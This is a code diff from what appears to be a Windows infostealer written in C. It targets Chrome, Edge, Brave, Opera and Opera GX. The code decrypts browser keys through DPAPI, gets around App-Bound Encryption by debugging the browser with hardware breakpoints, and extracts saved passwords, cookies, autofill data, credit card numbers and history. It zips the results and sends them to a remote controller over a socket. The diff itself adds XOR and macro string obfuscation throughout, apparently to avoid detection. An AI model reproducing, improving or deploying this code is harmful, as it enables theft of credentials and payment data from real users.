@@ -35,39 +35,39 @@ typedef struct {
 
 static BrowserConfig configs[] = {
     {
-        "Chrome", "chrome.exe",
-        {"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe", NULL},
-        "chrome.dll",
-        {"Google", "Chrome", "User Data", NULL},
-        "chrome_collect", "chrome_tmp", 0, 0, 1
+        XOR_MARKER "\x00" "Chrome", XOR_MARKER "\x00" "chrome.exe",
+        {XOR_MARKER "\x00" "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", XOR_MARKER "\x00" "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe", NULL},
+        XOR_MARKER "\x00" "chrome.dll",
+        {XOR_MARKER "\x00" "Google", XOR_MARKER "\x00" "Chrome", XOR_MARKER "\x00" "User Data", NULL},
+        XOR_MARKER "\x00" "chrome_collect", XOR_MARKER "\x00" "chrome_tmp", 0, 0, 1
     },
     {
-        "Edge", "msedge.exe",
-        {"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe", NULL},
-        "msedge.dll",
-        {"Microsoft", "Edge", "User Data", NULL},
-        "edge_collect", "edge_tmp", 1, 0, 1
+        XOR_MARKER "\x00" "Edge", XOR_MARKER "\x00" "msedge.exe",
+        {XOR_MARKER "\x00" "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", XOR_MARKER "\x00" "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe", NULL},
+        XOR_MARKER "\x00" "msedge.dll",
+        {XOR_MARKER "\x00" "Microsoft", XOR_MARKER "\x00" "Edge", XOR_MARKER "\x00" "User Data", NULL},
+        XOR_MARKER "\x00" "edge_collect", XOR_MARKER "\x00" "edge_tmp", 1, 0, 1
     },
     {
-        "Brave", "brave.exe",
-        {"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", "C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", NULL},
-        "chrome.dll",
-        {"BraveSoftware", "Brave-Browser", "User Data", NULL},
-        "brave_collect", "brave_tmp", 0, 0, 1
+        XOR_MARKER "\x00" "Brave", XOR_MARKER "\x00" "brave.exe",
+        {XOR_MARKER "\x00" "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", XOR_MARKER "\x00" "C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", NULL},
+        XOR_MARKER "\x00" "chrome.dll",
+        {XOR_MARKER "\x00" "BraveSoftware", XOR_MARKER "\x00" "Brave-Browser", XOR_MARKER "\x00" "User Data", NULL},
+        XOR_MARKER "\x00" "brave_collect", XOR_MARKER "\x00" "brave_tmp", 0, 0, 1
     },
     {
-        "Opera", "opera.exe",
-        {NULL, "C:\\Program Files\\Opera\\launcher.exe", "C:\\Program Files (x86)\\Opera\\launcher.exe", NULL},
-        "launcher_lib.dll",
-        {"Opera Software", "Opera Stable", NULL},
-        "opera_collect", "opera_tmp", 0, 1, 0
+        XOR_MARKER "\x00" "Opera", XOR_MARKER "\x00" "opera.exe",
+        {NULL, XOR_MARKER "\x00" "C:\\Program Files\\Opera\\launcher.exe", XOR_MARKER "\x00" "C:\\Program Files (x86)\\Opera\\launcher.exe", NULL},
+        XOR_MARKER "\x00" "launcher_lib.dll",
+        {XOR_MARKER "\x00" "Opera Software", XOR_MARKER "\x00" "Opera Stable", NULL},
+        XOR_MARKER "\x00" "opera_collect", XOR_MARKER "\x00" "opera_tmp", 0, 1, 0
     },
     {
-        "Operagx", "opera.exe",
-        {NULL, "C:\\Program Files\\Opera GX\\launcher.exe", "C:\\Program Files (x86)\\Opera GX\\launcher.exe", NULL},
-        "launcher_lib.dll",
-        {"Opera Software", "Opera GX Stable", NULL},
-        "operagx_collect", "operagx_tmp", 0, 1, 0
+        XOR_MARKER "\x00" "Operagx", XOR_MARKER "\x00" "opera.exe",
+        {NULL, XOR_MARKER "\x00" "C:\\Program Files\\Opera GX\\launcher.exe", XOR_MARKER "\x00" "C:\\Program Files (x86)\\Opera GX\\launcher.exe", NULL},
+        XOR_MARKER "\x00" "launcher_lib.dll",
+        {XOR_MARKER "\x00" "Opera Software", XOR_MARKER "\x00" "Opera GX Stable", NULL},
+        XOR_MARKER "\x00" "operagx_collect", XOR_MARKER "\x00" "operagx_tmp", 0, 1, 0
     },
     {NULL}
 };
@@ -103,7 +103,7 @@ static BYTE* decrypt_blob(const BYTE* blob, DWORD len, const BYTE* v10_key, cons
     if (len <= 15) return NULL;
     BYTE* plain = NULL;
 
-    if (memcmp(blob, "v10", 3) == 0 && len > 15) {
+    if (memcmp(blob, _S("v10"), 3) == 0 && len > 15) {
         const BYTE* keys[2] = { v10_key, v20_key };
         for (int i = 0; i < 2; i++) {
             if (!keys[i]) continue;
@@ -121,7 +121,7 @@ static BYTE* decrypt_blob(const BYTE* blob, DWORD len, const BYTE* v10_key, cons
             }
             free(plain);
         }
-    } else if (memcmp(blob, "v20", 3) == 0 && len > 15) {
+    } else if (memcmp(blob, _S("v20"), 3) == 0 && len > 15) {
         const BYTE* keys[2] = { v20_key, v10_key };
         for (int i = 0; i < 2; i++) {
             if (!keys[i]) continue;
@@ -155,7 +155,7 @@ static BYTE* decrypt_blob(const BYTE* blob, DWORD len, const BYTE* v10_key, cons
 
 static BYTE* get_v10_key(const char* user_data_dir, DWORD* out_len, int* is_dpapi) {
     char path[MAX_PATH];
-    _snprintf(path, sizeof(path), "%s\\Local State", user_data_dir);
+    _snprintf(path, sizeof(path), _S("%s\\Local State"), user_data_dir);
     FILE* f = fopen(path, "rb");
     if (!f) return NULL;
     fseek(f, 0, SEEK_END);
@@ -169,9 +169,9 @@ static BYTE* get_v10_key(const char* user_data_dir, DWORD* out_len, int* is_dpap
     cJSON* json = cJSON_Parse(buf);
     free(buf);
     if (!json) return NULL;
-    cJSON* crypt = cJSON_GetObjectItemCaseSensitive(json, "os_crypt");
+    cJSON* crypt = cJSON_GetObjectItemCaseSensitive(json, _S("os_crypt"));
     if (!crypt) { cJSON_Delete(json); return NULL; }
-    cJSON* enc_key_node = cJSON_GetObjectItemCaseSensitive(crypt, "encrypted_key");
+    cJSON* enc_key_node = cJSON_GetObjectItemCaseSensitive(crypt, _S("encrypted_key"));
     if (!enc_key_node || !enc_key_node->valuestring) { cJSON_Delete(json); return NULL; }
 
     size_t enc_len;
@@ -179,7 +179,7 @@ static BYTE* get_v10_key(const char* user_data_dir, DWORD* out_len, int* is_dpap
     cJSON_Delete(json);
     if (!enc_key) return NULL;
 
-    *is_dpapi = (enc_len >= 5 && memcmp(enc_key, "DPAPI", 5) == 0);
+    *is_dpapi = (enc_len >= 5 && memcmp(enc_key, _S("DPAPI"), 5) == 0);
     DATA_BLOB in = { *is_dpapi ? (DWORD)enc_len - 5 : (DWORD)enc_len, *is_dpapi ? enc_key + 5 : enc_key };
     DATA_BLOB out = { 0, NULL };
     if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
@@ -222,9 +222,9 @@ static size_t find_target_address(HANDLE hProcess, void* base_addr) {
     ReadProcessMemory(hProcess, (BYTE*)base_addr + dos.e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + nt.FileHeader.SizeOfOptionalHeader, sections, sizeof(IMAGE_SECTION_HEADER) * sec_count, &read);
 
     size_t string_va = 0;
-    const char* target = "OSCrypt.AppBoundProvider.Decrypt.ResultCode";
+    const char* target = _S("OSCrypt.AppBoundProvider.Decrypt.ResultCode");
     for (DWORD i = 0; i < sec_count; i++) {
-        if (memcmp(sections[i].Name, ".rdata", 6) == 0) {
+        if (memcmp(sections[i].Name, _S(".rdata"), 6) == 0) {
             BYTE* data = malloc(sections[i].Misc.VirtualSize);
             ReadProcessMemory(hProcess, (BYTE*)base_addr + sections[i].VirtualAddress, data, sections[i].Misc.VirtualSize, &read);
             for (DWORD j = 0; j < (DWORD)(sections[i].Misc.VirtualSize - strlen(target)); j++) {
@@ -242,7 +242,7 @@ static size_t find_target_address(HANDLE hProcess, void* base_addr) {
 
     size_t target_addr = 0;
     for (DWORD i = 0; i < sec_count; i++) {
-        if (memcmp(sections[i].Name, ".text", 5) == 0) {
+        if (memcmp(sections[i].Name, _S(".text"), 5) == 0) {
             BYTE* data = malloc(sections[i].Misc.VirtualSize);
             ReadProcessMemory(hProcess, (BYTE*)base_addr + sections[i].VirtualAddress, data, sections[i].Misc.VirtualSize, &read);
             for (DWORD j = 0; j < (DWORD)(sections[i].Misc.VirtualSize - 7); j++) {
@@ -345,7 +345,7 @@ static int copy_file(const char* src, const char* dst) {
 }
 
 static sqlite3* copy_and_open_db(const char* db_path, const char* temp_prefix, char* out_temp_path) {
-    sprintf(out_temp_path, "%s\\%s_%u", getenv("TEMP"), temp_prefix, GetTickCount());
+    sprintf(out_temp_path, _S("%s\\%s_%u"), getenv(_S("TEMP")), temp_prefix, GetTickCount());
     if (!copy_file(db_path, out_temp_path)) return NULL;
     sqlite3* db;
     if (sqlite3_open(out_temp_path, &db) != SQLITE_OK) {
@@ -357,14 +357,14 @@ static sqlite3* copy_and_open_db(const char* db_path, const char* temp_prefix, c
 
 static void extract_history(const char* profile_path, const char* out_dir, const char* temp_prefix) {
     char db_path[MAX_PATH], temp_path[MAX_PATH], out_file[MAX_PATH];
-    _snprintf(db_path, sizeof(db_path), "%s\\History", profile_path);
-    _snprintf(out_file, sizeof(out_file), "%s\\history.txt", out_dir);
+    _snprintf(db_path, sizeof(db_path), _S("%s\\History"), profile_path);
+    _snprintf(out_file, sizeof(out_file), _S("%s\\history.txt"), out_dir);
 
     sqlite3* db = copy_and_open_db(db_path, temp_prefix, temp_path);
     if (!db) return;
 
     sqlite3_stmt* stmt;
-    const char* query = "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 100";
+    const char* query = _S("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 100");
     if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
         FILE* f = fopen(out_file, "w");
         if (f) {
@@ -372,7 +372,7 @@ static void extract_history(const char* profile_path, const char* out_dir, const
                 const char* url = (const char*)sqlite3_column_text(stmt, 0);
                 const char* title = (const char*)sqlite3_column_text(stmt, 1);
                 int count = sqlite3_column_int(stmt, 2);
-                fprintf(f, "URL: %s | Title: %s | Visits: %d\n", url ? url : "", title ? title : "", count);
+                fprintf(f, _S("URL: %s | Title: %s | Visits: %d\n"), url ? url : "", title ? title : "", count);
             }
             fclose(f);
         }
@@ -384,8 +384,8 @@ static void extract_history(const char* profile_path, const char* out_dir, const
 
 static void extract_autofill(const char* profile_path, const char* out_dir, const BYTE* v10, const BYTE* v20, const char* temp_prefix, int is_opera) {
     char db_path[MAX_PATH], temp_path[MAX_PATH], out_file[MAX_PATH];
-    _snprintf(db_path, sizeof(db_path), "%s\\Web Data", profile_path);
-    _snprintf(out_file, sizeof(out_file), "%s\\autofill.txt", out_dir);
+    _snprintf(db_path, sizeof(db_path), _S("%s\\Web Data"), profile_path);
+    _snprintf(out_file, sizeof(out_file), _S("%s\\autofill.txt"), out_dir);
 
     sqlite3* db = copy_and_open_db(db_path, temp_prefix, temp_path);
     if (!db) return;
@@ -395,29 +395,29 @@ static void extract_autofill(const char* profile_path, const char* out_dir, cons
 
     sqlite3_stmt* stmt;
     // Form History
-    if (sqlite3_prepare_v2(db, "SELECT name, value FROM autofill", -1, &stmt, NULL) == SQLITE_OK) {
+    if (sqlite3_prepare_v2(db, _S("SELECT name, value FROM autofill"), -1, &stmt, NULL) == SQLITE_OK) {
         while (sqlite3_step(stmt) == SQLITE_ROW) {
-            fprintf(f, "Form: %s = %s\n", sqlite3_column_text(stmt, 0), sqlite3_column_text(stmt, 1));
+            fprintf(f, _S("Form: %s = %s\n"), sqlite3_column_text(stmt, 0), sqlite3_column_text(stmt, 1));
         }
         sqlite3_finalize(stmt);
     }
 
     // Profiles
-    const char* tables[] = {"autofill_profile_names", "autofill_profile_emails", "autofill_profile_phones"};
+    const char* tables[] = {_S("autofill_profile_names"), _S("autofill_profile_emails"), _S("autofill_profile_phones")};
     for (int i = 0; i < 3; i++) {
         char query[256];
-        const char* col = (i == 0) ? "first_name" : (i == 1) ? "email" : "number";
-        sprintf(query, "SELECT guid, %s FROM %s", col, tables[i]);
+        const char* col = (i == 0) ? _S("first_name") : (i == 1) ? _S("email") : _S("number");
+        sprintf(query, _S("SELECT guid, %s FROM %s"), col, tables[i]);
         if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
             while (sqlite3_step(stmt) == SQLITE_ROW) {
-                fprintf(f, "%s (%s): %s\n", tables[i], sqlite3_column_text(stmt, 0), sqlite3_column_text(stmt, 1));
+                fprintf(f, _S("%s (%s): %s\n"), tables[i], sqlite3_column_text(stmt, 0), sqlite3_column_text(stmt, 1));
             }
             sqlite3_finalize(stmt);
         }
     }
 
     // Credit Cards
-    if (sqlite3_prepare_v2(db, "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", -1, &stmt, NULL) == SQLITE_OK) {
+    if (sqlite3_prepare_v2(db, _S("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"), -1, &stmt, NULL) == SQLITE_OK) {
         while (sqlite3_step(stmt) == SQLITE_ROW) {
             const char* name = (const char*)sqlite3_column_text(stmt, 0);
             int m = sqlite3_column_int(stmt, 1);
@@ -425,7 +425,7 @@ static void extract_autofill(const char* profile_path, const char* out_dir, cons
             int len = sqlite3_column_bytes(stmt, 3);
             const BYTE* blob = sqlite3_column_blob(stmt, 3);
             BYTE* dec = decrypt_blob(blob, len, v10, v20, is_opera);
-            fprintf(f, "Card: %s | Exp: %d/%d | Num: %s\n", name ? name : "", m, y, dec ? (char*)dec : "ERR");
+            fprintf(f, _S("Card: %s | Exp: %d/%d | Num: %s\n"), name ? name : "", m, y, dec ? (char*)dec : "ERR");
             if (dec) free(dec);
         }
         sqlite3_finalize(stmt);
@@ -441,7 +441,7 @@ static void dump_sqlite_table(sqlite3* db, const char* query, FILE* out, const c
     if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
         int cols = sqlite3_column_count(stmt);
         while (sqlite3_step(stmt) == SQLITE_ROW) {
-            fprintf(out, "[%s]\n", label);
+            fprintf(out, _S("[%s]\n"), label);
             for (int i = 0; i < cols; i++) {
                 const char* name = sqlite3_column_name(stmt, i);
                 if (sqlite3_column_type(stmt, i) == SQLITE_BLOB) {
@@ -449,15 +449,15 @@ static void dump_sqlite_table(sqlite3* db, const char* query, FILE* out, const c
                     const BYTE* blob = sqlite3_column_blob(stmt, i);
                     BYTE* dec = decrypt_blob(blob, len, v10, v20, is_opera);
                     if (dec) {
-                        fprintf(out, "%s: %s\n", name, dec);
+                        fprintf(out, _S("%s: %s\n"), name, dec);
                         free(dec);
                     }
                 } else {
                     const char* val = (const char*)sqlite3_column_text(stmt, i);
-                    fprintf(out, "%s: %s\n", name, val ? val : "NULL");
+                    fprintf(out, _S("%s: %s\n"), name, val ? val : _S("NULL"));
                 }
             }
-            fprintf(out, "---\n");
+            fprintf(out, _S("---\n"));
         }
         sqlite3_finalize(stmt);
     }
@@ -465,14 +465,14 @@ static void dump_sqlite_table(sqlite3* db, const char* query, FILE* out, const c
 
 static void extract_passwords(const char* profile_path, const char* out_dir, const BYTE* v10, const BYTE* v20, const char* temp_prefix, int is_opera) {
     char db_path[MAX_PATH], temp_path[MAX_PATH], out_file[MAX_PATH];
-    _snprintf(db_path, sizeof(db_path), "%s\\Login Data", profile_path);
-    _snprintf(out_file, sizeof(out_file), "%s\\passwords.txt", out_dir);
+    _snprintf(db_path, sizeof(db_path), _S("%s\\Login Data"), profile_path);
+    _snprintf(out_file, sizeof(out_file), _S("%s\\passwords.txt"), out_dir);
 
     sqlite3* db = copy_and_open_db(db_path, temp_prefix, temp_path);
     if (!db) return;
 
     sqlite3_stmt* stmt;
-    if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, NULL) == SQLITE_OK) {
+    if (sqlite3_prepare_v2(db, _S("SELECT origin_url, username_value, password_value FROM logins"), -1, &stmt, NULL) == SQLITE_OK) {
         FILE* f = fopen(out_file, "w");
         if (f) {
             while (sqlite3_step(stmt) == SQLITE_ROW) {
@@ -482,7 +482,7 @@ static void extract_passwords(const char* profile_path, const char* out_dir, con
                 const BYTE* blob = sqlite3_column_blob(stmt, 2);
                 BYTE* dec = decrypt_blob(blob, len, v10, v20, is_opera);
                 if (dec) {
-                    fprintf(f, "URL: %s\nUser: %s\nPass: %s\n---\n", url ? url : "", user ? user : "", (char*)dec);
+                    fprintf(f, _S("URL: %s\nUser: %s\nPass: %s\n---\n"), url ? url : "", user ? user : "", (char*)dec);
                     free(dec);
                 }
             }
@@ -496,17 +496,17 @@ static void extract_passwords(const char* profile_path, const char* out_dir, con
 
 static void extract_cookies(const char* profile_path, const char* out_dir, const BYTE* v10, const BYTE* v20, const char* temp_prefix, int is_opera) {
     char db_path[MAX_PATH], temp_path[MAX_PATH], out_file[MAX_PATH];
-    _snprintf(db_path, sizeof(db_path), "%s\\Network\\Cookies", profile_path);
+    _snprintf(db_path, sizeof(db_path), _S("%s\\Network\\Cookies"), profile_path);
     if (!PathFileExistsA(db_path)) {
-        _snprintf(db_path, sizeof(db_path), "%s\\Cookies", profile_path);
+        _snprintf(db_path, sizeof(db_path), _S("%s\\Cookies"), profile_path);
     }
-    _snprintf(out_file, sizeof(out_file), "%s\\cookies.txt", out_dir);
+    _snprintf(out_file, sizeof(out_file), _S("%s\\cookies.txt"), out_dir);
 
     sqlite3* db = copy_and_open_db(db_path, temp_prefix, temp_path);
     if (!db) return;
 
     sqlite3_stmt* stmt;
-    if (sqlite3_prepare_v2(db, "SELECT host_key, name, value, encrypted_value FROM cookies", -1, &stmt, NULL) == SQLITE_OK) {
+    if (sqlite3_prepare_v2(db, _S("SELECT host_key, name, value, encrypted_value FROM cookies"), -1, &stmt, NULL) == SQLITE_OK) {
         FILE* f = fopen(out_file, "w");
         if (f) {
             while (sqlite3_step(stmt) == SQLITE_ROW) {
@@ -518,10 +518,10 @@ static void extract_cookies(const char* profile_path, const char* out_dir, const
                 BYTE* dec = decrypt_blob(blob, len, v10, v20, is_opera);
 
                 if (dec) {
-                    fprintf(f, "Host: %s | Name: %s | Value: %s\n", host ? host : "", name ? name : "", (char*)dec);
+                    fprintf(f, _S("Host: %s | Name: %s | Value: %s\n"), host ? host : "", name ? name : "", (char*)dec);
                     free(dec);
                 } else if (value && strlen(value) > 0) {
-                    fprintf(f, "Host: %s | Name: %s | Value: %s\n", host ? host : "", name ? name : "", value);
+                    fprintf(f, _S("Host: %s | Name: %s | Value: %s\n"), host ? host : "", name ? name : "", value);
                 }
             }
             fclose(f);
@@ -554,7 +554,7 @@ static void zip_add_dir(mz_zip_archive* zip, const char* base_path, const char* 
 
 static void extract_all_profiles(const char* user_data_dir, const char* out_root, const BYTE* v10, const BYTE* v20, const char* temp_prefix, int is_opera) {
     char search_path[MAX_PATH];
-    sprintf(search_path, "%s\\*", user_data_dir);
+    sprintf(search_path, _S("%s\\*"), user_data_dir);
     WIN32_FIND_DATAA fd;
     HANDLE hFind = FindFirstFileA(search_path, &fd);
     if (hFind == INVALID_HANDLE_VALUE) return;
@@ -562,11 +562,11 @@ static void extract_all_profiles(const char* user_data_dir, const char* out_root
         if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
             if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
             char pref_path[MAX_PATH];
-            sprintf(pref_path, "%s\\%s\\Preferences", user_data_dir, fd.cFileName);
+            sprintf(pref_path, _S("%s\\%s\\Preferences"), user_data_dir, fd.cFileName);
             if (PathFileExistsA(pref_path)) {
                 char profile_path[MAX_PATH], profile_out[MAX_PATH];
-                sprintf(profile_path, "%s\\%s", user_data_dir, fd.cFileName);
-                sprintf(profile_out, "%s\\%s", out_root, fd.cFileName);
+                sprintf(profile_path, _S("%s\\%s"), user_data_dir, fd.cFileName);
+                sprintf(profile_out, _S("%s\\%s"), out_root, fd.cFileName);
                 CreateDirectoryA(profile_out, NULL);
                 extract_from_profile(profile_path, profile_out, v10, v20, temp_prefix, is_opera);
             }
@@ -597,7 +597,7 @@ static void finish_collection(const BrowserConfig* config, const char* extract_d
     mz_zip_archive zip;
     memset(&zip, 0, sizeof(zip));
     if (!mz_zip_writer_init_heap(&zip, 0, 65536)) {
-        sock_send(sock, mutex, "[browser_zip_err]Zip init failed");
+        sock_send(sock, mutex, _S("[browser_zip_err]Zip init failed"));
         recursive_delete(extract_dir);
         return;
     }
@@ -607,7 +607,7 @@ static void finish_collection(const BrowserConfig* config, const char* extract_d
     void* zip_buf;
     size_t zip_size;
     if (!mz_zip_writer_finalize_heap_archive(&zip, &zip_buf, &zip_size)) {
-        sock_send(sock, mutex, "[browser_zip_err]Zip finalize failed");
+        sock_send(sock, mutex, _S("[browser_zip_err]Zip finalize failed"));
         mz_zip_writer_end(&zip);
         recursive_delete(extract_dir);
         return;
@@ -617,7 +617,7 @@ static void finish_collection(const BrowserConfig* config, const char* extract_d
     char* b64 = base64_encode(zip_buf, zip_size, &b64_len);
     if (b64) {
         char msg_prefix[256];
-        sprintf(msg_prefix, "[browser_zip]%s_collect.zip|", config->name);
+        sprintf(msg_prefix, _S("[browser_zip]%s_collect.zip|"), config->name);
         size_t total_len = strlen(msg_prefix) + b64_len + 2;
         char* total_msg = malloc(total_len);
         sprintf(total_msg, "%s%s", msg_prefix, b64);
@@ -625,7 +625,7 @@ static void finish_collection(const BrowserConfig* config, const char* extract_d
         free(total_msg);
         free(b64);
     } else {
-        sock_send(sock, mutex, "[browser_zip_err]Base64 failed");
+        sock_send(sock, mutex, _S("[browser_zip_err]Base64 failed"));
     }
 
     mz_zip_writer_end(&zip);
@@ -635,71 +635,71 @@ static void finish_collection(const BrowserConfig* config, const char* extract_d
 void collect_browser_data(const char* browser_name, SOCKET sock, HANDLE mutex) {
     BrowserConfig* config = NULL;
     for (int i = 0; configs[i].name != NULL; i++) {
-        if (_stricmp(configs[i].name, browser_name) == 0) { config = &configs[i]; break; }
+        if (_stricmp(xor_str((char*)configs[i].name), browser_name) == 0) { config = &configs[i]; break; }
     }
-    if (!config) { sock_send(sock, mutex, "[browser_zip_err]Unknown browser"); return; }
+    if (!config) { sock_send(sock, mutex, _S("[browser_zip_err]Unknown browser")); return; }
 
     char user_data[MAX_PATH] = { 0 };
     char appdata_env[MAX_PATH];
-    if (config->use_roaming) GetEnvironmentVariableA("APPDATA", appdata_env, MAX_PATH);
-    else GetEnvironmentVariableA("LOCALAPPDATA", appdata_env, MAX_PATH);
+    if (config->use_roaming) GetEnvironmentVariableA(_S("APPDATA"), appdata_env, MAX_PATH);
+    else GetEnvironmentVariableA(_S("LOCALAPPDATA"), appdata_env, MAX_PATH);
 
     strcpy(user_data, appdata_env);
     for(int i=0; config->user_data_subdir[i]; i++) {
-        strcat(user_data, "\\");
-        strcat(user_data, config->user_data_subdir[i]);
+        strcat(user_data, _S("\\"));
+        strcat(user_data, xor_str((char*)config->user_data_subdir[i]));
     }
 
     if (!PathFileExistsA(user_data)) {
         char msg[256];
-        sprintf(msg, "[browser_zip_err]%s user data not found", config->name);
+        sprintf(msg, _S("[browser_zip_err]%s user data not found"), xor_str((char*)config->name));
         sock_send(sock, mutex, msg);
         return;
     }
 
     const char* exe_path = NULL;
     char custom_opera_path[MAX_PATH];
-    if (strstr(config->name, "Opera")) {
+    if (strstr(xor_str((char*)config->name), _S("Opera"))) {
         char user_profile[MAX_PATH];
-        GetEnvironmentVariableA("USERPROFILE", user_profile, MAX_PATH);
-        if (strcmp(config->name, "Opera") == 0) {
-            sprintf(custom_opera_path, "%s\\AppData\\Local\\Programs\\Opera\\opera.exe", user_profile);
+        GetEnvironmentVariableA(_S("USERPROFILE"), user_profile, MAX_PATH);
+        if (strcmp(xor_str((char*)config->name), _S("Opera")) == 0) {
+            sprintf(custom_opera_path, _S("%s\\AppData\\Local\\Programs\\Opera\\opera.exe"), user_profile);
         } else {
-            sprintf(custom_opera_path, "%s\\AppData\\Local\\Programs\\Opera GX\\opera.exe", user_profile);
+            sprintf(custom_opera_path, _S("%s\\AppData\\Local\\Programs\\Opera GX\\opera.exe"), user_profile);
         }
         if (PathFileExistsA(custom_opera_path)) exe_path = custom_opera_path;
     }
 
     if (!exe_path) {
         for(int i=0; i<4; i++) {
-            if (config->exe_paths[i] && PathFileExistsA(config->exe_paths[i])) { exe_path = config->exe_paths[i]; break; }
+            if (config->exe_paths[i] && PathFileExistsA(xor_str((char*)config->exe_paths[i]))) { exe_path = xor_str((char*)config->exe_paths[i]); break; }
         }
     }
 
     if (!exe_path) {
         char msg[256];
-        sprintf(msg, "[browser_zip_err]%s exe not found", config->name);
+        sprintf(msg, _S("[browser_zip_err]%s exe not found"), xor_str((char*)config->name));
         sock_send(sock, mutex, msg);
         return;
     }
 
-    kill_process(config->process_name);
-    if (strstr(config->name, "Opera")) kill_process("launcher.exe");
+    kill_process(xor_str((char*)config->process_name));
+    if (strstr(xor_str((char*)config->name), _S("Opera"))) kill_process(_S("launcher.exe"));
 
     DWORD v10_len = 0;
     int is_dpapi = 0;
     BYTE* v10_key = get_v10_key(user_data, &v10_len, &is_dpapi);
-    int is_opera = strstr(config->name, "Opera") != NULL;
+    int is_opera = strstr(xor_str((char*)config->name), _S("Opera")) != NULL;
 
     char extract_root[MAX_PATH];
-    sprintf(extract_root, "%s\\%s_%u", getenv("TEMP"), config->output_dir, GetTickCount());
+    sprintf(extract_root, _S("%s\\%s_%u"), getenv(_S("TEMP")), xor_str((char*)config->output_dir), GetTickCount());
     CreateDirectoryA(extract_root, NULL);
 
     if (v10_key && !config->has_abe) {
         if (is_dpapi) {
-            extract_all_profiles(user_data, extract_root, v10_key, NULL, config->temp_prefix, is_opera);
+            extract_all_profiles(user_data, extract_root, v10_key, NULL, xor_str((char*)config->temp_prefix), is_opera);
         } else {
-            extract_all_profiles(user_data, extract_root, v10_key, v10_key, config->temp_prefix, is_opera);
+            extract_all_profiles(user_data, extract_root, v10_key, v10_key, xor_str((char*)config->temp_prefix), is_opera);
         }
         finish_collection(config, extract_root, sock, mutex);
         LocalFree(v10_key);
@@ -708,7 +708,7 @@ void collect_browser_data(const char* browser_name, SOCKET sock, HANDLE mutex) {
 
     if (!config->has_abe) {
         char msg[256];
-        sprintf(msg, "[browser_zip_err]%s: no key and ABE not supported", config->name);
+        sprintf(msg, _S("[browser_zip_err]%s: no key and ABE not supported"), xor_str((char*)config->name));
         sock_send(sock, mutex, msg);
         recursive_delete(extract_root);
         if (v10_key) LocalFree(v10_key);
@@ -718,11 +718,11 @@ void collect_browser_data(const char* browser_name, SOCKET sock, HANDLE mutex) {
     STARTUPINFO si = { sizeof(si) };
     PROCESS_INFORMATION pi = { 0 };
     char cmd[MAX_PATH];
-    sprintf(cmd, "\"%s\" --no-first-run --no-default-browser-check", exe_path);
+    sprintf(cmd, _S("\"%s\" --no-first-run --no-default-browser-check"), exe_path);
 
     if (!CreateProcess(NULL, cmd, NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
         char msg[256];
-        sprintf(msg, "[browser_zip_err]%s: CreateProcess failed (%u)", config->name, GetLastError());
+        sprintf(msg, _S("[browser_zip_err]%s: CreateProcess failed (%u)"), config->name, GetLastError());
         sock_send(sock, mutex, msg);
         recursive_delete(extract_root);
         if (v10_key) LocalFree(v10_key);
@@ -738,7 +738,7 @@ void collect_browser_data(const char* browser_name, SOCKET sock, HANDLE mutex) {
         if (de.dwDebugEventCode == LOAD_DLL_DEBUG_EVENT) {
             char path[MAX_PATH];
             if (GetFinalPathNameByHandleA(de.u.LoadDll.hFile, path, MAX_PATH, 0)) {
-                if (strstr(path, config->dll_name)) {
+                if (strstr(path, xor_str((char*)config->dll_name))) {
                     target_addr = find_target_address(pi.hProcess, de.u.LoadDll.lpBaseOfDll);
                     if (target_addr) set_hw_bp_all_threads(de.dwProcessId, target_addr);
                 }
@@ -793,13 +793,13 @@ void collect_browser_data(const char* browser_name, SOCKET sock, HANDLE mutex) {
     CloseHandle(pi.hThread);
 
     if (success) {
-        extract_all_profiles(user_data, extract_root, v10_key, v20_key, config->temp_prefix, is_opera);
+        extract_all_profiles(user_data, extract_root, v10_key, v20_key, xor_str((char*)config->temp_prefix), is_opera);
         finish_collection(config, extract_root, sock, mutex);
     } else if (v10_key) {
-        extract_all_profiles(user_data, extract_root, v10_key, NULL, config->temp_prefix, is_opera);
+        extract_all_profiles(user_data, extract_root, v10_key, NULL, xor_str((char*)config->temp_prefix), is_opera);
         finish_collection(config, extract_root, sock, mutex);
     } else {
-        sock_send(sock, mutex, "[browser_zip_err]Failed to find keys");
+        sock_send(sock, mutex, _S("[browser_zip_err]Failed to find keys"));
         recursive_delete(extract_root);
     }
 
